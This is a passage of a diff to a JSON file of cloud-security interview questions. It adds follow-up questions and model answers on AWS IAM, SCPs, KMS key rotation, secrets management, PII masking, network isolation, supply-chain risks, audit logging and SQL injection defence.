@@ -18,6 +18,20 @@
           "}"
         ]
       }
+    ],
+    "followups": [
+      {
+        "q": "Generating a policy from CloudTrail only captures actions that were exercised. What's the failure mode and how do you handle it?",
+        "a": "CloudTrail-derived policies are blind to rarely-used or seasonal actions (month-end jobs, DR failover, error paths), so a generated policy can be too tight and break later. I treat the generated policy as a starting point, run it through a soak period in a non-prod account, and watch `AccessDenied` events in CloudTrail to add legitimately-missing actions before promoting."
+      },
+      {
+        "q": "When does an IAM `Condition` block actually buy you security versus just adding noise?",
+        "a": "Conditions earn their keep when they constrain something the action/resource pair can't, like `aws:SourceVpce`, `aws:PrincipalOrgID`, `aws:SecureTransport`, or `s3:prefix`. They're noise when they restate the resource ARN or check attributes an attacker controls. The test: would the condition stop a confused-deputy or wrong-network call that the ARN alone would allow?"
+      },
+      {
+        "q": "Access Analyzer flags unused permissions. Why not just auto-revoke everything it flags?",
+        "a": "Auto-revoking risks breaking the exact rare paths CloudTrail can't see, and a blind sweep across roles can cascade outages. I gate revocation on a review window, exclude break-glass and DR roles, and revoke in stages with alarms, because the cost of a wrongly-removed permission (a midnight page) usually exceeds the marginal risk of one stale grant."
+      }
     ]
   },
   {
@@ -25,7 +39,21 @@
     "a": "Both set a maximum (a ceiling), not a grant. A permissions boundary is attached per-identity (user or role) to cap what its identity-based policies can grant, which is ideal for delegating role creation safely. An SCP is an AWS Organizations guardrail that applies to every principal in an account or OU automatically, so it scales for org-wide least privilege. Effective permissions are the intersection: an action must be allowed by the SCP, the boundary, and the identity policy.",
     "fs": "SCPs for org-wide guardrails that auto-apply to new accounts, boundaries for delegating role creation without privilege escalation; effective perms are the intersection of all three.",
     "fj": "They're basically the same thing, just an allow-list of permissions.",
-    "level": "Sr"
+    "level": "Sr",
+    "followups": [
+      {
+        "q": "How exactly does a permissions boundary prevent privilege escalation when you delegate role creation?",
+        "a": "You let a developer create roles but attach an SCP/policy condition requiring `iam:PermissionsBoundary` be set to your boundary on any role they create. Because the boundary caps effective permissions, they can't mint a role more powerful than the boundary even though they have `iam:CreateRole`. Without that condition, delegated `CreateRole` is effectively `*` escalation."
+      },
+      {
+        "q": "SCPs don't grant anything, only restrict. What's a common mistake people make assuming an SCP gives access?",
+        "a": "People add an `Allow` SCP expecting it to grant permissions; it only widens the ceiling, the identity policy still must grant the action. The classic incident is removing `FullAWSAccess` from an OU thinking it tightens things, which actually denies everything because SCPs deny-by-default once a non-`*` SCP is attached. Effective access is still SCP ∩ identity policy."
+      },
+      {
+        "q": "Do SCPs apply to the management account's root user, and why does that matter?",
+        "a": "No, SCPs do not restrict the management (payer) account, so anything running there bypasses your org guardrails entirely. That's why you keep the management account empty of workloads, enable strong MFA and break-glass-only access on it, and run real workloads in member accounts where SCPs actually bite."
+      }
+    ]
   },
   {
     "q": "Why prefer IAM roles over long-lived access keys for application and service access?",
@@ -46,6 +74,20 @@
           "    aws-region: us-east-1"
         ]
       }
+    ],
+    "followups": [
+      {
+        "q": "OIDC federation from GitHub Actions removes the stored key, but what's the dangerous misconfiguration in the role's trust policy?",
+        "a": "A too-loose `sub` condition. If you match only the repo and not the branch/environment (e.g. `repo:org/app:*`), any branch or PR from a fork can assume the role. You must pin `token.actions.githubusercontent.com:sub` to specific refs like `repo:org/app:ref:refs/heads/main` or an environment, and verify the `aud` claim, or an attacker's PR workflow gets prod credentials."
+      },
+      {
+        "q": "STS credentials are temporary, but the role can still be over-permissioned. How do you bound a single assume-role session further?",
+        "a": "Use a session policy (passed at `AssumeRole` time) to intersect down to just what that invocation needs, and set a short `DurationSeconds`. For cross-account or delegated assumption, require an `ExternalId` to block the confused-deputy problem. Temporary doesn't mean safe; a leaked 1-hour token with admin is still admin for an hour."
+      },
+      {
+        "q": "What's the residual risk with instance profiles / IMDS even though no static key exists?",
+        "a": "The instance metadata endpoint hands out role credentials to anything that can reach it, so SSRF or a compromised process on the box can pull the role's temporary creds. The mitigation is IMDSv2 (session-token-required, hop-limit 1) so a basic SSRF can't fetch them, plus scoping the instance role tightly so a stolen token is low-value."
+      }
     ]
   },
   {
@@ -53,7 +95,21 @@
     "a": "Encryption in transit (TLS) protects data moving across the network from eavesdropping and tampering; encryption at rest protects stored data (disks, object stores, backups, snapshots) if media or storage is compromised. They defend different threat models, so one is not a substitute for the other. A complete posture enforces TLS 1.2+ on every connection and uses server-side encryption (e.g. SSE-KMS, encrypted EBS/RDS) for everything persisted, including backups.",
     "fs": "I enforce TLS 1.2+ end to end and default-encrypt all storage with KMS, including snapshots and backups, since the threat models are different.",
     "fj": "We use HTTPS, so the data is already encrypted everywhere.",
-    "level": "Jr"
+    "level": "Jr",
+    "followups": [
+      {
+        "q": "Encryption at rest protects against stolen media, but what threat does it explicitly NOT protect against?",
+        "a": "It does nothing against an attacker with valid application or database credentials, because the storage layer decrypts transparently for authorized reads. SSE-KMS stops someone who steals a disk or snapshot, not someone who runs `SELECT *` through your app. That's why at-rest encryption is necessary but never sufficient; you still need access control and least privilege."
+      },
+      {
+        "q": "Where does data sit decrypted even when you've enabled both at-rest and in-transit encryption?",
+        "a": "In memory and at the application/processing layer, where the data is plaintext while in use. TLS terminates at the load balancer or app, and storage decrypts on read, so a memory dump, a verbose log, or a compromised process sees cleartext. Closing that gap needs field-level encryption, tokenization, or confidential computing, not just transport and disk encryption."
+      },
+      {
+        "q": "A team enabled TLS but a downstream replication hop is plaintext. How do you catch this kind of gap?",
+        "a": "Map every hop in the data flow (ingest, internal service mesh, replication, backup export) and assert encryption on each, then enforce with controls like `aws:SecureTransport` deny policies, mesh mTLS, and TLS-required DB parameters. Gaps hide in internal east-west traffic people assume is 'inside the perimeter', which zero-trust says to encrypt anyway."
+      }
+    ]
   },
   {
     "q": "What is envelope encryption and why does KMS use it instead of encrypting data directly?",
@@ -72,6 +128,20 @@
           "# returns Plaintext (use, wipe)",
           "# and CiphertextBlob (store w/ data)"
         ]
+      }
+    ],
+    "followups": [
+      {
+        "q": "The plaintext DEK is used locally then 'discarded'. Why does that wording matter, and what goes wrong if it isn't?",
+        "a": "If the plaintext DEK lingers in memory, in a log, or gets persisted next to the ciphertext, an attacker who reads it decrypts the data without ever calling KMS, defeating the whole scheme. You must zero it from memory right after use and never write it down; the only key that should survive at rest is the KMS-wrapped `CiphertextBlob`."
+      },
+      {
+        "q": "If the KEK never re-encrypts the data, how does rotating the KEK actually protect already-encrypted objects?",
+        "a": "It doesn't re-protect old ciphertext per se; KMS retains old KEK versions so old wrapped DEKs still unwrap. Real protection comes from rotating DEKs (re-wrapping or re-encrypting data with fresh DEKs) over time. KEK rotation mainly limits the blast radius and meets compliance; true key-compromise recovery needs DEK rotation plus re-encryption of affected data."
+      },
+      {
+        "q": "How does caching DEKs (e.g. via the AWS Encryption SDK) trade off performance against security?",
+        "a": "Reusing a cached DEK across many encrypt operations slashes KMS calls and latency, but it widens the blast radius if that DEK leaks and weakens cryptographic guarantees (key reuse). You bound it with the data-key caching limits: max bytes and max messages per DEK plus a short TTL, so you get throughput while capping how much data any single key ever protects."
       }
     ]
   },
@@ -93,6 +163,20 @@
           "    - id: gitleaks"
         ]
       }
+    ],
+    "followups": [
+      {
+        "q": "Why is rotation the only real fix for a committed secret, even on a private repo you force-pushed to clean?",
+        "a": "Git history is distributed; forks, clones, CI caches, and GitHub's own unreachable-commit views may still hold the blob even after a rewrite, and you can't prove every copy is gone. The secret must be assumed harvested the moment it landed, so you rotate to invalidate the value itself, then optionally scrub history as cleanup, not as the fix."
+      },
+      {
+        "q": "Pre-commit scanning runs on the developer's machine. Why isn't that sufficient on its own?",
+        "a": "Pre-commit hooks are opt-in and trivially bypassed (`--no-verify`, or a dev who never installed them), so they catch honest mistakes, not determined or careless ones. You need a server-side gate too: secret scanning on push/PR (GitHub push protection, CI gitleaks) that blocks the merge, so the control doesn't depend on every laptop being configured correctly."
+      },
+      {
+        "q": "Fetching from a secrets manager at runtime introduces a new dependency. What failure modes does that add?",
+        "a": "Now the manager is on your critical path: an outage, throttling, or IAM misconfig can stop the app from booting. You mitigate with short-lived in-memory caching of fetched secrets, graceful handling of rotation mid-run, and regional failover, while still never persisting the secret to disk. The trade is a runtime dependency in exchange for no static secret at rest."
+      }
     ]
   },
   {
@@ -113,6 +197,20 @@
           "# revoked automatically at TTL"
         ]
       }
+    ],
+    "followups": [
+      {
+        "q": "Dynamic DB creds create a new database user per lease. What operational limit does that hit at scale?",
+        "a": "Each lease mints a real DB role, so high request rates plus long TTLs can exhaust the database's max-roles/connection limits or bloat `pg_roles`. You tune by raising TTLs modestly, capping max leases, and letting connection pooling amortize creds across requests rather than minting one per query, balancing blast-radius against the database's own object limits."
+      },
+      {
+        "q": "If a dynamic secret is auto-revoked at TTL, why do you still need explicit lease revocation?",
+        "a": "TTL expiry is the slow path; on a known compromise or a deploy you want to kill credentials immediately, not wait an hour. Vault lease revocation (or revoke-prefix) lets you invalidate all outstanding creds for an app on demand, which is the incident-response lever. Auto-expiry bounds exposure; explicit revocation collapses it to now."
+      },
+      {
+        "q": "What happens to in-flight work when a dynamic credential's lease expires mid-operation?",
+        "a": "The credential stops working immediately at revocation, so a long query or connection using it fails. The client must renew the lease before expiry (Vault agent does this) or re-fetch and reconnect, and the app needs retry/reconnect logic. Short TTLs without renewal handling turn into mysterious mid-job auth failures."
+      }
     ]
   },
   {
@@ -120,14 +218,42 @@
     "a": "Use a dual-secret (two-password) rotation pattern: create a second credential, deploy it so the app can use either, switch traffic to the new one, verify, then retire the old. AWS Secrets Manager implements this with an alternating-users Lambda; the app always reads the current secret from the manager rather than caching it. The key is overlap: both the old and new credentials are valid during the cutover so no in-flight request fails.",
     "fs": "Alternating-user rotation with an overlap window where both creds are valid, and the app resolves the secret at connect time so cutover is seamless.",
     "fj": "I change the password in the database and then quickly update the app config before too many requests fail.",
-    "level": "Sr"
+    "level": "Sr",
+    "followups": [
+      {
+        "q": "Why is the alternating-USERS strategy generally safer than the single-user 'rotate this one password' strategy?",
+        "a": "Single-user rotation has a race: the instant you change the password, any app instance still holding the old one fails until it re-fetches. Alternating-users keeps two valid accounts and flips between them, so there's always a fully-working credential during cutover. The cost is managing two DB users; the payoff is a genuine zero-failure window."
+      },
+      {
+        "q": "The app 'reads the current secret at connect time'. What breaks if it caches the secret instead?",
+        "a": "A cached secret survives past rotation, so when the old credential is retired the app keeps presenting a dead password and every new connection fails. You need cache invalidation on `AccessDenied`/auth errors with a re-fetch, or short cache TTLs, so the app picks up the rotated value. Aggressive long-lived caching defeats the whole overlap design."
+      },
+      {
+        "q": "How do you verify the new credential actually works BEFORE retiring the old one, inside an automated rotation?",
+        "a": "Secrets Manager's four-step rotation Lambda has a `testSecret` phase that opens a real connection with the pending credential and runs a trivial query; only if that succeeds does `finishSecret` promote it. Skipping verification is how you retire the working credential and discover the new one was misconfigured during an outage."
+      }
+    ]
   },
   {
     "q": "What is PII and how should it be governed differently from ordinary data?",
     "a": "PII (personally identifiable information) is data that can identify a person directly (name, SSN, email) or indirectly when combined. Governance requires data classification and a catalog so you know where PII lives, access controls and masking so only authorized roles see raw values, encryption, retention/deletion policies tied to regulations (GDPR, CCPA), and audit logging of access. The first practical step is discovery and tagging columns by sensitivity, because you can't protect what you haven't classified.",
     "fs": "I classify and tag PII columns in the catalog first, then enforce masking, retention, and access policies that reference those tags so controls follow the data.",
     "fj": "PII is just any data, and we keep it all in the warehouse forever in case we need it.",
-    "level": "Jr"
+    "level": "Jr",
+    "followups": [
+      {
+        "q": "What is quasi-identifier risk, and why can 'non-PII' columns still re-identify someone?",
+        "a": "Quasi-identifiers like ZIP, birth date, and gender aren't PII alone but combine to uniquely identify most people; classic studies re-identified individuals from just those three. So governance can't only protect obvious fields, it must consider linkage risk, which is why techniques like k-anonymity, generalization, or suppression apply to combinations, not just direct identifiers."
+      },
+      {
+        "q": "How do you handle PII that lands in places the catalog doesn't track, like free-text fields or logs?",
+        "a": "Structured-column classification misses PII smuggled into comment fields, support tickets, and application logs. You need DLP/pattern scanning over unstructured text and log scrubbing at the ingest boundary, plus a policy that free-text columns are treated as potentially-sensitive by default. Unmonitored sinks are where PII quietly escapes your governance."
+      },
+      {
+        "q": "Tag-based policies are powerful, but what's the risk when a new PII column is added without a tag?",
+        "a": "Untagged data falls through tag-scoped controls and is exposed by default, so a single missed tag silently leaks PII. The fix is a deny-by-default posture for unclassified columns plus automated discovery that flags or quarantines new untagged columns, so the failure mode is 'blocked', not 'open'."
+      }
+    ]
   },
   {
     "q": "Compare dynamic data masking, static masking, and tokenization for protecting PII columns.",
@@ -147,6 +273,20 @@
           "  ELSE '***MASKED***' END;"
         ]
       }
+    ],
+    "followups": [
+      {
+        "q": "Dynamic masking leaves raw data in storage. What attack does that leave open that static masking closes?",
+        "a": "Dynamic masking only filters at query time, so anyone who can read the underlying files, snapshots, or replicas, or who bypasses the masking policy via a privileged role, still sees raw values. Static masking removes the raw data entirely from that copy, which is why non-prod and shared copies should be statically masked rather than relying on a runtime policy."
+      },
+      {
+        "q": "Why is hashing a PII column a poor substitute for tokenization?",
+        "a": "Hashing is deterministic and unsalted hashes of low-entropy data (emails, SSNs, phone numbers) are trivially reversible via rainbow tables or brute force, and even salted hashes still leak equality joins. Tokenization uses a secure mapping in a separate vault so tokens reveal nothing and are reversible only by an authorized detokenization service; a hash is neither private nor cleanly reversible."
+      },
+      {
+        "q": "Does masking preserve referential integrity and joins, and why does that matter for tokenization design?",
+        "a": "If you need to join or analyze across systems, you need deterministic/format-preserving tokenization so the same input maps to the same token everywhere; random masking breaks joins and referential integrity. The trade-off is that deterministic tokenization reintroduces equality-linkage risk, so you scope it carefully and keep the detokenization key tightly controlled."
+      }
     ]
   },
   {
@@ -154,7 +294,21 @@
     "a": "Network isolation limits which resources can reach each other so a compromise can't move laterally. In a VPC, a public subnet has a route to an internet gateway (for load balancers, NAT), while a private subnet has no inbound route from the internet; databases and app servers live there and reach out only via a NAT gateway. Security groups (stateful, instance-level) and network ACLs (stateless, subnet-level) further restrict traffic, ideally allowing only the specific ports and source groups required.",
     "fs": "Data tier in private subnets with no IGW route, egress via NAT, and security groups that reference other SGs by ID rather than CIDR ranges.",
     "fj": "I put everything in one subnet and open the security group to 0.0.0.0/0 so the services can talk.",
-    "level": "Jr"
+    "level": "Jr",
+    "followups": [
+      {
+        "q": "Security groups are stateful and NACLs are stateless. What does that practically change about how you write their rules?",
+        "a": "A security group automatically allows the return traffic for an allowed connection, so you only specify one direction. A NACL doesn't track state, so you must explicitly allow the ephemeral return port range (typically 1024-65535) in the opposite direction, or replies get dropped. Forgetting the ephemeral-port return rule is the classic NACL debugging trap."
+      },
+      {
+        "q": "Why reference security groups by SG ID instead of CIDR ranges, and what does that buy you?",
+        "a": "Referencing the source SG (e.g. 'allow from the app-tier SG') means the rule follows membership, not IP addresses, so autoscaling adds/removes instances with no rule changes and no broad CIDR holes. It also expresses intent ('app tier may reach DB tier') and avoids the over-broad `/16` ranges that creep in when you allow by CIDR."
+      },
+      {
+        "q": "A private subnet with NAT still has unrestricted outbound. Why is that an exfiltration risk and how do you tighten it?",
+        "a": "Open egress lets a compromised host phone home or exfiltrate data to any internet endpoint, and most security groups default to allow-all outbound. You tighten with egress restrictions to known destinations, VPC endpoints so AWS-API traffic never hits the internet, and an egress firewall/proxy with domain allow-lists, turning 'can reach anything' into 'can reach only what it needs'."
+      }
+    ]
   },
   {
     "q": "How do you let a service in a private subnet reach AWS APIs (like S3 or KMS) without sending traffic over the internet?",
@@ -175,6 +329,20 @@
           "}"
         ]
       }
+    ],
+    "followups": [
+      {
+        "q": "Gateway endpoints and interface endpoints differ in more than which services they support. How do they differ in cost and mechanism?",
+        "a": "Gateway endpoints (S3, DynamoDB) work by adding a route-table entry and are free; interface endpoints create an ENI with a private IP via PrivateLink and bill per-hour plus per-GB. So for S3/DynamoDB you prefer the free gateway endpoint, while everything else needs interface endpoints whose cost you weigh against the NAT data-processing charges they replace."
+      },
+      {
+        "q": "An endpoint policy plus an S3 bucket policy can both reference the endpoint. How do you stop data egress to buckets outside your org?",
+        "a": "You combine two controls: an endpoint policy that allows only your org's principals/buckets, and bucket policies using `aws:SourceVpce` to allow access only through your endpoint. Layer in `aws:PrincipalOrgID` conditions so even a misconfigured request can't read a foreign bucket. The endpoint becomes a chokepoint that enforces 'only our data, only our principals'."
+      },
+      {
+        "q": "Interface endpoints rely on private DNS. What breaks if private DNS is disabled or DNS resolution isn't enabled on the VPC?",
+        "a": "Without private DNS, the service's public hostname keeps resolving to public IPs, so traffic silently leaves via the internet/NAT instead of the endpoint, defeating the isolation you intended. You must enable DNS resolution and hostnames on the VPC and 'private DNS' on the endpoint, then verify the service hostname resolves to the endpoint's private IP."
+      }
     ]
   },
   {
@@ -182,7 +350,21 @@
     "a": "Broken Access Control is #1 in OWASP Top 10 2025 (and SSRF was folded into it). It occurs when users can act outside their intended permissions, e.g. by tampering with an ID in a URL (IDOR), forced browsing, or missing function-level checks. Defenses: deny by default, enforce authorization server-side on every request (never trust the client), verify object ownership before returning data, and use centralized access-control logic rather than scattered per-endpoint checks.",
     "fs": "Deny by default, enforce ownership/authorization server-side on every object access through one central policy layer, and treat SSRF as an access-control problem too.",
     "fj": "We hide the admin page link in the UI so regular users can't get to it.",
-    "level": "Mid"
+    "level": "Mid",
+    "followups": [
+      {
+        "q": "Why was SSRF folded into Broken Access Control, and how does that reframing help you defend it?",
+        "a": "SSRF is fundamentally the server acting outside its intended permissions, fetching internal resources on an attacker's behalf, which is an access-control failure at the server's identity. Reframing it that way pushes you to deny-by-default egress and allow-list destinations rather than only sanitizing URLs, treating 'what can this server reach' as an authorization decision."
+      },
+      {
+        "q": "IDOR is the canonical example. Why does checking 'is the user logged in' fail to stop it?",
+        "a": "Authentication proves identity but says nothing about whether this identity owns resource #1234. IDOR exploits exactly that gap: a logged-in user swaps the ID and reads someone else's record because the handler never verified ownership. The fix is an authorization check binding the object to the caller (`resource.owner_id == current_user`) on every object access, not just a login gate."
+      },
+      {
+        "q": "Why is centralized access-control logic safer than per-endpoint checks, even if both are server-side?",
+        "a": "Per-endpoint checks scatter the rule across dozens of handlers, so the inevitable forgotten check on the newest endpoint becomes a hole, and audits must inspect every route. A central policy layer (middleware, a policy engine like OPA) means access is denied by default and every request flows through one enforced, testable decision point you can reason about and audit once."
+      }
+    ]
   },
   {
     "q": "What is a Software Supply Chain Failure (new in OWASP Top 10 2025) and how do you mitigate it?",
@@ -203,6 +385,20 @@
           "  ghcr.io/corp/api:1.4.2"
         ]
       }
+    ],
+    "followups": [
+      {
+        "q": "An SBOM lists your dependencies, but it's not a control by itself. What makes it actually useful?",
+        "a": "An SBOM is only valuable if you do something with it: continuously match it against new CVE disclosures so that when the next Log4Shell drops you know in minutes which artifacts ship the vulnerable component. A stale SBOM sitting in a bucket adds nothing; the value is fast, automated 'are we affected and where' answers during an incident."
+      },
+      {
+        "q": "Provenance attestation (SLSA) proves where an artifact was built. What attack does that stop that a checksum doesn't?",
+        "a": "A checksum proves the artifact matches what you have, but not that it was built from your source by your trusted pipeline; an attacker who tampers with the build can produce a 'valid' checksum for malicious output. SLSA provenance cryptographically binds the artifact to the builder, source commit, and parameters, so you can reject anything not built by your hardened CI from the expected repo."
+      },
+      {
+        "q": "SCA scanning catches KNOWN CVEs. What class of supply-chain attack does it miss, and what covers that gap?",
+        "a": "It misses zero-day malicious packages, freshly typosquatted names, and compromised maintainer releases that have no CVE yet, exactly the install-time backdoors like the xz-style or event-stream incidents. You cover that with behavioral/malware scanning of packages, pinned hashes so a swapped version is rejected, build sandboxing that blocks install-script egress, and slowing adoption of brand-new versions."
+      }
     ]
   },
   {
@@ -210,21 +406,63 @@
     "a": "Dependency confusion is a supply-chain attack where an attacker publishes a package to a public registry using the same name as one of your private/internal packages with a higher version number; the resolver pulls the malicious public one. Prevention: scope/namespace internal packages, configure the package manager to pull internal names only from the private registry, pin and hash-lock versions, and reserve your internal names on the public registry so they can't be claimed.",
     "fs": "I namespace internal packages, lock each scope to its registry, hash-pin versions, and pre-register internal names publicly so the public registry can't shadow them.",
     "fj": "Our internal packages have unique names, so nobody could publish the same thing.",
-    "level": "Sr"
+    "level": "Sr",
+    "followups": [
+      {
+        "q": "Why does a 'higher version number' on the public registry beat your real internal package?",
+        "a": "Many resolvers, when a package name resolves in multiple configured registries, pick the highest version across all of them rather than honoring registry precedence. So an attacker publishing `your-internal-lib@99.0.0` publicly outranks your real `1.2.0` private build. The fix is scoping names to a single registry so the resolver never even considers the public source for internal names."
+      },
+      {
+        "q": "Namespacing/scoping internal packages helps, but what configuration detail makes or breaks it?",
+        "a": "The scope must be hard-bound to your private registry (e.g. npm `@yourco:registry=...`, or an `.npmrc`/pip index config that never falls back to the public index for that scope). If the fallback to the public registry stays enabled, scoping is cosmetic; the attacker just claims the scope publicly. No-fallback-for-internal-names is the load-bearing setting."
+      },
+      {
+        "q": "Why pre-register your internal names on the public registry even if you never publish real code there?",
+        "a": "Registering placeholder packages under your internal names (and your scope) denies attackers the ability to ever claim them, closing the confusion vector even if some build environment is misconfigured. It's a cheap belt-and-suspenders control: defense doesn't rely solely on every consumer's resolver config being perfect."
+      }
+    ]
   },
   {
     "q": "What should an effective audit log capture, and why must audit logs be tamper-resistant?",
     "a": "An audit log should record who did what, to which resource, when, from where, and the outcome (allow/deny), with a stable identifier and enough context to reconstruct events. It must be tamper-resistant because if an attacker who gains access can also edit or delete logs, the trail is worthless for incident response and compliance. You achieve this with append-only, immutable storage (e.g. S3 Object Lock / WORM), shipping logs to a separate account or system, and integrity validation (CloudTrail log file validation, hash chaining).",
     "fs": "Logs go to a separate, append-only WORM store in a logging account with CloudTrail file-integrity validation, so even an admin in the workload account can't rewrite history.",
     "fj": "The app writes a log line to the same database table, and admins can clean it up if needed.",
-    "level": "Mid"
+    "level": "Mid",
+    "followups": [
+      {
+        "q": "Audit logs themselves can leak data. What should you be careful NOT to log?",
+        "a": "Logs must capture context to reconstruct events but not secrets or raw PII, so you exclude passwords, tokens, full card/SSN values, and request bodies with sensitive fields, or you redact them. Otherwise the immutable, widely-read audit store becomes a high-value, long-retained breach target, and you've turned a security control into a data-exposure liability."
+      },
+      {
+        "q": "Object Lock makes logs immutable, but how do you reconcile WORM immutability with deletion rules like GDPR's right to erasure?",
+        "a": "You design audit logs to reference subjects by pseudonymous IDs rather than raw PII, and you separate the (deletable) PII mapping from the (immutable) event trail. Retention is then bounded by a compliance-set Object Lock period after which records expire, so you balance 'can't tamper' against 'must eventually purge', rather than locking PII forever."
+      },
+      {
+        "q": "Log file validation / hash chaining proves integrity. How does that actually detect tampering or gaps?",
+        "a": "Each log file is hashed and the hashes are chained (each digest covers the prior), and CloudTrail signs a digest file. Altering, deleting, or inserting any file breaks the chain and fails signature verification, so you can prove the trail is complete and unmodified, or detect exactly where a gap was introduced, instead of trusting that nothing was quietly removed."
+      }
+    ]
   },
   {
     "q": "Why centralize audit logs into a separate, locked-down account or system?",
     "a": "Centralizing logs into a dedicated logging account (or SIEM) means an attacker who compromises a workload account cannot also alter or destroy the evidence, since they lack access to the log store. It also enables consistent retention, cross-account correlation, and a single place to run detections and alerts. In AWS this is typically an Organization-level CloudTrail writing to an S3 bucket in a separate account with Object Lock and restricted, monitored access.",
     "fs": "A central org-trail to a dedicated logging account with Object Lock and break-glass-only access separates the auditor from the audited.",
     "fj": "Each team keeps its own logs in its own account so they can manage them.",
-    "level": "Sr"
+    "level": "Sr",
+    "followups": [
+      {
+        "q": "An org-level CloudTrail is configured by the management account. Why can't a compromised member account disable it?",
+        "a": "An organization trail is owned and managed centrally; member-account principals can't stop, delete, or reconfigure it, and SCPs further deny `cloudtrail:StopLogging`/`DeleteTrail` in member accounts. So even full admin in a workload account can't blind the trail, which is the whole point of separating who generates logs from who controls them."
+      },
+      {
+        "q": "Cross-account correlation is a selling point. What concrete attack does correlating logs across accounts reveal that per-account logs hide?",
+        "a": "Lateral movement and cross-account role assumption: an attacker who pivots from a dev account into prod via `sts:AssumeRole` shows up as disconnected events in two separate per-account logs, but a centralized SIEM stitches the chain (same source IP, session, timeline) into one detectable attack path. Siloed logs make multi-account intrusions nearly invisible."
+      },
+      {
+        "q": "The logging account is now a high-value target. How do you protect it from becoming the single point of compromise?",
+        "a": "You harden it as a 'crown-jewel' account: break-glass-only human access with phishing-resistant MFA, no workloads running in it, SCP-enforced restrictions, Object Lock so even its own admins can't rewrite history, and alerting on any access to the log store itself. The goal is that compromising one workload account never grants reach into the evidence store."
+      }
+    ]
   },
   {
     "q": "Why should you rotate encryption keys, and what does KMS automatic key rotation actually do?",
@@ -242,6 +480,20 @@
           "  --rotation-period-in-days 365"
         ]
       }
+    ],
+    "followups": [
+      {
+        "q": "If KMS keeps old key material so old ciphertext still decrypts, does rotation actually protect data encrypted before a key compromise?",
+        "a": "No, and that's the key subtlety: old material is retained, so data encrypted under a compromised KEK is still decryptable with it. Automatic rotation limits exposure of FUTURE data and meets compliance, but recovering from an actual key compromise requires re-encrypting affected data under new material, not just rotating. Rotation reduces blast radius going forward, it doesn't retroactively protect."
+      },
+      {
+        "q": "Why does KMS automatic rotation only cover symmetric KMS-generated material, not imported keys?",
+        "a": "For imported key material, you supplied the bytes, so KMS can't generate replacement material on its own without breaking your external source of truth; rotation would orphan data tied to your original import. So you rotate imported keys manually by importing new material into a new key and re-wrapping/ re-encrypting, owning the lifecycle KMS otherwise automates."
+      },
+      {
+        "q": "Rotating the KEK doesn't re-wrap existing data keys. So how do you actually get fresh DEKs over time?",
+        "a": "DEK freshness comes from re-encryption at the data layer, not KEK rotation: you re-`GenerateDataKey` and rewrite objects on write, on a scheduled re-encrypt job, or via S3 bucket-key/SSE settings. KEK rotation changes the wrapping key; only re-encrypting the underlying data changes which DEKs protect it, which is what bounds per-DEK data volume."
+      }
     ]
   },
   {
@@ -249,7 +501,21 @@
     "a": "An AWS-managed key is created and controlled by a service on your behalf with limited configurability; a customer-managed key is one you create and fully control: its key policy, grants, rotation schedule, and crucially the ability to deny or revoke access. You need a customer-managed key when you require a custom key policy (e.g. cross-account access), control over rotation, the ability to disable/delete the key to make data unreadable, or auditable, granular access via CloudTrail. The trade-off is you own the operational responsibility.",
     "fs": "I use customer-managed keys when I need custom key policies, cross-account grants, controllable rotation, or the kill-switch ability to revoke decrypt access.",
     "fj": "AWS-managed and customer-managed keys are the same; I just pick whatever default shows up.",
-    "level": "Sr"
+    "level": "Sr",
+    "followups": [
+      {
+        "q": "Disabling a customer-managed key is described as a 'kill-switch'. What's the operational danger of that power?",
+        "a": "Disabling or scheduling deletion of the KEK makes all data wrapped by it instantly undecryptable, including backups and snapshots, so an accidental or malicious disable is a self-inflicted outage or data-loss event. You guard it with tight key-policy permissions on `DisableKey`/`ScheduleKeyDeletion`, the mandatory deletion waiting period (7-30 days), and alarms, because the kill-switch cuts both ways."
+      },
+      {
+        "q": "For cross-account access, the key policy and the IAM policy both matter. How do they interact for a CMK?",
+        "a": "A CMK is gated by its key policy first; unlike most resources, IAM policies alone can't grant KMS access unless the key policy delegates to IAM (`Enable IAM policies`) or explicitly trusts the external account/principal. For cross-account use you grant in the key policy AND the consumer's IAM policy, and effective access is the intersection, so a missing key-policy statement silently blocks otherwise-authorized callers."
+      },
+      {
+        "q": "AWS-managed keys are 'free' to operate. What cost and quota considerations push you toward or away from many CMKs?",
+        "a": "Each CMK has a monthly charge plus per-request API costs and a regional request-rate quota, so spraying one CMK per table/tenant adds cost and can throttle high-QPS decrypt paths. You balance isolation (a key per sensitivity domain or tenant for blast-radius and revocation) against cost/quota, often using one CMK per data domain plus envelope encryption and bucket keys to cut KMS calls."
+      }
+    ]
   },
   {
     "q": "How do you enforce that an S3 bucket is never publicly accessible and always encrypted?",
@@ -272,6 +538,20 @@
           "  } } }"
         ]
       }
+    ],
+    "followups": [
+      {
+        "q": "Why is account-level Block Public Access stronger than relying on per-bucket settings and policies?",
+        "a": "Account-level BPA is an override that no bucket policy, ACL, or future bucket can defeat, so a new bucket created by any team is private by default and a misconfigured policy can't open it. Per-bucket settings depend on every bucket being configured correctly forever; the account-level switch makes 'public' impossible org-wide rather than merely discouraged."
+      },
+      {
+        "q": "Default encryption now applies to new objects. What's the gap regarding objects that already existed before you turned it on?",
+        "a": "Default encryption only affects objects written after it's enabled, so pre-existing objects keep whatever (or no) encryption they had. You close the gap by re-encrypting existing objects (copy-in-place with the new SSE setting or an S3 Batch Operations job) and verifying with an inventory report, rather than assuming the bucket-level setting retroactively secured old data."
+      },
+      {
+        "q": "The deny-PutObject-without-encryption-header pattern is partly legacy now. What changed and why keep the policy anyway?",
+        "a": "S3 now encrypts every new object by default, so the header-deny is less necessary for basic encryption, but you keep an explicit deny to FORCE a specific CMK (denying `PutObject` unless `s3:x-amz-server-side-encryption-aws-kms-key-id` matches yours). That stops objects landing under the wrong or AWS-managed key, enforcing your key policy and kill-switch, not just 'some' encryption."
+      }
     ]
   },
   {
@@ -293,6 +573,20 @@
         ],
         "accent": "fix"
       }
+    ],
+    "followups": [
+      {
+        "q": "Parameterization handles values, but you can't bind a table or column name. How do you safely handle a dynamic ORDER BY or table name?",
+        "a": "Identifiers can't be bind parameters, so you must validate them against a server-side allow-list of known-good column/table names and map user input to a fixed set, never interpolate the raw string. Anything dynamic in the SQL structure (sort column, direction, table) is the one place injection still creeps in, and allow-listing is the defense, not escaping."
+      },
+      {
+        "q": "Why is escaping quotes an unreliable defense even when done 'carefully'?",
+        "a": "Escaping is a denylist that must anticipate every encoding, charset quirk, and numeric/identifier context, and attackers exploit the cases you missed (multibyte charsets, numeric fields needing no quotes, second-order injection). Parameterization sidesteps the entire problem by never mixing data into the parsed SQL, which is why it's structurally safe where escaping is perpetually almost-right."
+      },
+      {
